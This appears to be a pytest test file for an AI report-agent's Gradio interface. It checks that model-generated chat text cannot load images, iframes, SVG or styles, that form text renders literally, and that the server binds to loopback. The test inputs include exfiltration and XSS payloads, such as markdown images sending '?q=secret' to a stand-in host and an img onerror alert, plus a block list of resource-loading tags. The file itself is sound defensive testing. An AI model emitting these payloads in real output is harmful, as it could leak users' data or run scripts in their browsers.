"""Model-controlled text must not create browser resource-loading elements."""

from html.parser import HTMLParser
from importlib import import_module
from pathlib import Path

import pytest

pytest.importorskip("deepagents")

from typer.testing import CliRunner

from report_agent.agent.config import AgentConfig
from report_agent.application.conversation import ConversationService
from report_agent.application.onboarding import OnboardingService
from report_agent.application.report_runs import ReportRuns
from report_agent.interfaces.gradio.app import create_app
from report_agent.interfaces.gradio.safe_text import chat_html, plain_text_html
from report_agent.storage.report_definitions import ReportStore


class Elements(HTMLParser):
    def __init__(self, value):
        super().__init__()
        self.tags, self.text = [], []
        self.feed(value)

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))

    def handle_data(self, data):
        self.text.append(data)


@pytest.mark.parametrize(
    "content",
    [
        "![sample](https://host.invalid/?q=secret)",
        "![sample][ref]\n\n[ref]: https://host.invalid/?q=secret",
        "![sample](https://host.invalid/a_(b).png)",
        "[![sample](https://host.invalid/?q=secret)](https://docs.invalid/)",
        '<img src="https://host.invalid/?q=secret" onerror="alert(1)">',
        '<svg><image href="https://host.invalid/?q=secret"/></svg>',
        '<iframe src="https://host.invalid/?q=secret"></iframe>',
        "<style>body{background:url(https://host.invalid/?q=secret)}</style>",
    ],
)
def test_chat_disables_images_and_raw_html_without_deleting_prose(content):
    result = chat_html("Select the region you want from your workbook.\n\n" + content)
    parsed = Elements(result)
    assert not {
        "img",
        "svg",
        "image",
        "iframe",
        "style",
        "source",
        "video",
        "audio",
        "object",
        "embed",
    } & {tag for tag, _ in parsed.tags}
    assert "Select the region you want from your workbook." in "".join(parsed.text)
    assert not any("src" in attrs or "style" in attrs for _, attrs in parsed.tags)


def test_form_text_is_literal_and_chat_keeps_normal_markdown():
    value = (
        "![](https://host.invalid/?q=secret) "
        '<img src="https://host.invalid/"> **title**'
    )
    rendered = Elements(plain_text_html(value))
    assert rendered.tags == [("p", {})]
    assert "".join(rendered.text) == value
    chat = chat_html("**Bold** and `code`\n\n[Documentation](https://docs.invalid/)")
    assert "<strong>Bold</strong>" in chat and "<code>code</code>" in chat
    assert 'href="https://docs.invalid/"' in chat


def test_starter_discovery_form_is_deterministic_without_an_agent(tmp_path):
    store = ReportStore(tmp_path / "library")
    service = ConversationService(
        AgentConfig("offline", Path(".agents/skills")),
        OnboardingService(store, ReportRuns(store, {}, tmp_path / "runs")),
        {},
        agent_factory=lambda *args: pytest.fail("Starter form contacted a model"),
    )
    app = create_app(service)
    start = next(fn.fn for fn in app.fns.values() if fn.api_name == "start_discovery")
    result = start(None)
    session = service.get_session(result[0])
    assert [field["id"] for field in session.input_form["fields"]] == [
        "purpose",
        "audience",
    ]
    assert not service.agents
    assert next(e for e in result[1] if e["kind"] == "input_form")["active"]


def test_serve_launch_defaults_to_loopback_and_disables_sharing(tmp_path, monkeypatch):
    cli = import_module("report_agent.interfaces.cli.app")
    gradio_app = import_module("report_agent.interfaces.gradio.app")
    theme = import_module("report_agent.interfaces.gradio.theme")
    captured = {}

    class App:
        def launch(self, **kwargs):
            captured.update(kwargs)

    monkeypatch.setattr(
        AgentConfig,
        "from_environment",
        classmethod(lambda cls: AgentConfig("launch-test", Path(".agents/skills"))),
    )
    monkeypatch.setattr(gradio_app, "create_app", lambda service: App())
    monkeypatch.setattr(theme, "launch_options", lambda: {})
    result = CliRunner().invoke(
        cli.app,
        [
            "serve",
            "--library",
            str(tmp_path / "library"),
            "--output",
            str(tmp_path / "runs"),
        ],
    )
    assert result.exit_code == 0, result.output
    assert captured["server_name"] == "127.0.0.1"
    assert captured["share"] is False
    assert captured["server_port"] == 7860
